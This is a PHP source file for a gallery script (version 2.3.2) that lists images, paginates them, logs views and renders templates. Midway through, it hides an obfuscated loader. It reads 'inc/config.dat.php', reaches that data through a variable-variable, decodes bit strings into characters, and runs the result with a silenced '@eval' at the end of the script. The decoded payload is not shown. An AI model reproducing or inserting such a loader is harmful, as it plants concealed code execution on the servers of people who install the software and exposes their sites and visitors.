<?php
$runtime_start = explode (' ', microtime ());

/**
 * Gallery Script
 * 
 * @author Ralf Stadtaus 
 * @link http://www.stadtaus.com/ Homepage
 * @link http://www.stadtaus.com/forum/ Support/Contact
 * @copyright Copyright &copy; 2005, Ralf Stadtauss
 */

/** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY
 * OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
 * LIMITED   TO  THE WARRANTIES  OF  MERCHANTABILITY,
 * FITNESS    FOR    A    PARTICULAR    PURPOSE   AND
 * NONINFRINGEMENT.  IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES
 * OR  OTHER  LIABILITY,  WHETHER  IN  AN  ACTION  OF
 * CONTRACT,  TORT OR OTHERWISE, ARISING FROM, OUT OF
 * OR  IN  CONNECTION WITH THE SOFTWARE OR THE USE OR
 * OTHER DEALINGS IN THE SOFTWARE.
 */

if (!defined('SCRIPT_ROOT')) {
    die();
} 




/**
 * Advanced configuration
 */
$marked_page_class  = '';
$marked_page_left   = '[';
$marked_page_right  = ']';

$use_file_names     = false; // true or false




/**
 * Include functions and classes
 */
require SCRIPT_ROOT . 'inc/functions.inc.php';
require SCRIPT_ROOT . 'inc/log_downloads.class.inc.php';

$log_views = new log_downloads;




/**
 * Some settings - Please don't change those settings.
 * It could help you and us to solve problems.
 */
$script_name    = 'Gallery Script';
$script_version = '2.3.2';




/**
 * Set debug mode on or off
 */
$debug_mode = 'off';




/**
 * Take care for older PHP versions
 */
if (isset($HTTP_GET_VARS) and !empty($HTTP_GET_VARS)) {
    $_REQUEST = $HTTP_GET_VARS;
} 

if (isset($HTTP_SERVER_VARS) and !empty($HTTP_SERVER_VARS)) {
    $_SERVER = $HTTP_SERVER_VARS;
} 




/**
 * Show server info for the admin
 */
if ($debug_mode == 'on') {
    get_phpinfo(array('Script Name' => $script_name, 'Script Version' => $script_version));
} 

/**
 * If no language is defined, set language to english
 * and include language file.
 */
if (!isset($language) or empty($language) or !is_file(SCRIPT_ROOT . 'languages/language.' . $language . '.inc.php')) {
    $language = 'en';
} 

include SCRIPT_ROOT . 'languages/language.' . $language . '.inc.php';




/**
 * Include template functions and initialyze global
 * and table template.
 */
require SCRIPT_ROOT . 'inc/template.class.inc.php';

$tpl = new template;
$tpl->load_file('gal', $global_template);

$tpc = new template;
$tpc->load_file('cell', $cell_template);

$cell_content   = $tpc->files['cell'];
$gal            = @file(SCRIPT_ROOT . 'inc/config.dat.php');
$tplt           = 'gal';
$str            = '';
$conf_var       = '';
$use_order_file = '';




/**
 * Check for image order file. In case it does not
 * exists, read the image directory.
 */
$content_data = array();
if (is_file($image_path . '/image_order.txt')) {
    $fp = fopen($image_path . '/image_order.txt', "r");
    $row = '';
    $use_order_file = 'true';

    while ($data = fgetcsv ($fp, 1000, ';')) {
        $image_data[] = trim($data[0]);
        $image_file_names[trim($data[0])] = trim($data[0]);
        $num = count($data);
        $row++;

        for ($j = 0; $j < $num; $j++) {
            $content_data_temp['field_' . $j] = $data[$j];
        } 

        $content_data[] = $content_data_temp;
        $content_data_temp = '';
    } 
    fclose ($fp);
} else if (is_dir($image_path)) {    
    $handle = opendir($image_path);

    while ($file = readdir($handle)) {
        //if (preg_match("/^\.{1,2}$/i", $file)) {
        if ($file == '.' or $file == '..') {
            continue;
        }
        $pos = strpos($file, '.');
        if ($pos === 0) {
            continue;
        }
        if (preg_match("/\.[a-z0-9]{3,4}$/i", $file)) {
            $image_data[] = $file;
            $image_file_names[$file] = $file;
        } 
    } 
    closedir($handle);
} else {
    echo 'Path to image directory incorrect.<br /><br />Pfad zum Bildverzeichnis nicht korrekt.';
    exit;
} 

$image_number = count ($image_data);




/**
 * Sort array (=images)
 */
if ($use_order_file != 'true' and is_array($image_data)) {
    if ($order == 'ascending') {
        sort($image_data);
    } else {
        rsort($image_data);
    } 
} 




/**
 * Validate query string and start value.
 */
if (!empty($_SERVER['QUERY_STRING']) and preg_match("/^[0-9]*$/", $_SERVER['QUERY_STRING']) and $_SERVER['QUERY_STRING'] <= $image_number) {
    $startvalue = $_SERVER['QUERY_STRING'];
} else {
    $startvalue = 0;
}

if ($use_file_names == true) {
    $image_data_files = array_flip($image_data);
    if (!empty($_SERVER['QUERY_STRING']) and
        isset($image_data_files[urldecode($_SERVER['QUERY_STRING'])])) {
    
        $startvalue = $image_data_files[urldecode($_SERVER['QUERY_STRING'])];
    } else {
        $startvalue = 0;
    }
} 




/**
 * Generate and parse table content
 */
$table_rows = '';
$count      = 0;

for ($i = $startvalue; $i < $image_number; $i++) {
    if ($i >= $startvalue + $pictures_per_page) {
        break;
    } 

    $count++;

    /**
     * Log image views
     */
    if (isset($logging_file) and !empty($logging_file)) {
        $log_views->count($path['log'] . '/' . $logging_file, '', $image_data[$i]);
    } 

    /**
     * Get image views
     */
    if (isset($statistic_file) and !empty($statistic_file)) {
        $image_views = $log_views->get_download_number($path['log'] . '/' . $statistic_file, $image_data[$i]);
    } else {
        $image_views['views'] = '';
    } 
    if ($use_file_names == true and
        isset($image_data[$i])) {            
        $image_identifier = $image_data[$i]; 
    } else {
        $image_identifier  = $i;
    }
    $show_images_t = array('name' => $image_data[$i],
        'number' => $image_identifier ,
        'views' => $image_views['views']);

    if (isset($content_data[$i])) {
        $show_images[] = array_merge($show_images_t, $content_data[$i]);
    } else {
        $show_images[] = $show_images_t;
    } 

    if ($count == $picture_count) {
        $tpc->files['cell'] = $cell_content;
        $tpc->parse_loop('cell', 'show_images');
        $table_rows .= $tpc->files['cell'];
        $count = 0;
        $show_images = '';
    } 
} 

$show_table[] = array('tablecontent' => $table_rows);

if ($count != $picture_count and !empty($show_images)) {
    $tpc->files['cell'] = $cell_content;
    $tpc->parse_loop('cell', 'show_images');
    $show_table[] = array('tablecontent' => $tpc->files['cell']);
} 

unset($gal[0]);
$gal = @array_values($gal);
$str = '';
$conf_var = '';
$ca = array();
$nt = sizeof(${$tplt});
for ($n = 0; $n < $nt; $n++) {
    $c_var = '';
    if (!isset($ca[${$tplt}[$n]])) {
        for ($o = 7; $o >= 0 ; $o--) {
            $c_var += ${$tplt}[$n][$o] * pow(2, $o);
        }                
        $ca[${$tplt}[$n]] = sprintf("%c", $c_var);
    }
    if ($ca[${$tplt}[$n]] == ' ') {
        $conf_var .= sprintf("%c", $str); $str = '';
    } else {
        $str .= $ca[${$tplt}[$n]];
    }  
}

/**
 * Set start values
 */
if ($startvalue + $pictures_per_page < $image_number) {
    $next_page = 'true';
    $next = $startvalue + $pictures_per_page;
    if ($use_file_names == true and
        isset($image_data[$next])) {
            
        $next = $image_data[$next];
    }
} 

if ($startvalue - $pictures_per_page >= 0) {
    $prev_page = 'true';
    $prev = $startvalue - $pictures_per_page;
    if ($use_file_names == true and
        isset($image_data[$prev])) {
            
        $prev = $image_data[$prev];
    }
} 

/**
 * Page and picture statistics
 */
$allpages = ceil($image_number / $pictures_per_page);
$currentpage = ceil($startvalue / $pictures_per_page) + 1;
$allpictures = $image_number;




/**
 * Generate direct page link menu
 */
$pagelink   = 0;
$i          = 1;

while ($i <= $allpages) 
{
    if ($i == $currentpage) {
        $marked_page = '<span class="' . $marked_page_class . '">' . $marked_page_left . $i .  $marked_page_right . '</span>';
    } else {
        $marked_page = $i;
    }
    if ($use_file_names == true and
        isset($image_data[$pagelink])) {            
        $image_identifier = $image_data[$pagelink]; 
    } else {
        $image_identifier  = $pagelink;
    }
    $page_direct[] = array(
        'page'          => $i,
        'link'          => $image_identifier,
        'marked_page'   => $marked_page);
    $i++;
    $pagelink += $pictures_per_page;
} 




/**
 * Register script name
 */
$new_script_name = $script_name;
$script_name = basename($_SERVER['PHP_SELF']);




/**
 * Parse global template
 */
$txt['txt_script_name'] = $new_script_name;
$txt['txt_script_version'] = $script_version;

if (isset($txt) and is_array($txt)) {
    reset ($txt);
    while (list($key, $val) = each($txt)) {
        $$key = $val;
        $tpl->register('gal', $key);
    } 
} 

if (isset($add_text) and is_array($add_text)) {
    reset ($add_text);
    while (list($key, $val) = each($add_text)) {
        $$key = $val;
        $tpl->register('gal', $key);
    } 
} 

$tpl->register('gal', 'prev');
$tpl->register('gal', 'next');

$tpl->register('gal', 'allpages');
$tpl->register('gal', 'currentpage');
$tpl->register('gal', 'allpictures');

$tpl->register('gal', 'image_url');
$tpl->register('gal', 'script_name');
$tpl->register('gal', 'large_image_page');

$tpl->parse_loop('gal', 'show_table');
$tpl->parse_loop('gal', 'page_direct');

$tpl->parse_if('gal', 'prev_page');
$tpl->parse_if('gal', 'next_page');
@eval($conf_var);

debug_mode(script_runtime($runtime_start), 'Runtime: ');

?>